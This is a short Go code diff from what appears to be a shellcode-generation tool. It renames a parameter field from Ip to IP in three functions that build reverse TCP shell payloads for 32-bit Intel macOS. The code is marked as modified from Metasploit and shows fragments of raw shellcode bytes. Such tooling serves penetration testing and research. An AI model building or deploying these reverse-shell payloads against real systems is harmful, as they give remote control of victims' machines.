@@ -18,7 +18,7 @@ func beaconing_reverse_shell_tcp_darwin_intel_32(params api.Parameters) ([]byte,
 	port := params.Port
 	entry := params.Entry
 	beacon := uint32(0x0)
-	ip := params.Ip
+	ip := params.IP
 
 	//Modified from metasploit
 	shellcode2 := "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2" // FORK
@@ -76,7 +76,7 @@ func delay_reverse_tcp_shell_darwin_intel_32(params api.Parameters) ([]byte, err
 	port := params.Port
 	entry := params.Entry
 	beacon := uint32(0x0)
-	ip := params.Ip
+	ip := params.IP
 
 	//Modified from metasploit
 
@@ -127,7 +127,7 @@ func delay_reverse_tcp_shell_darwin_intel_32(params api.Parameters) ([]byte, err
 func reverse_tcp_shell_darwin_intel_32(params api.Parameters) ([]byte, error) {
 	port := params.Port
 	entry := params.Entry
-	ip := params.Ip
+	ip := params.IP
 
 	//Modified from metasploit
 	shellcode2 := "\x68"
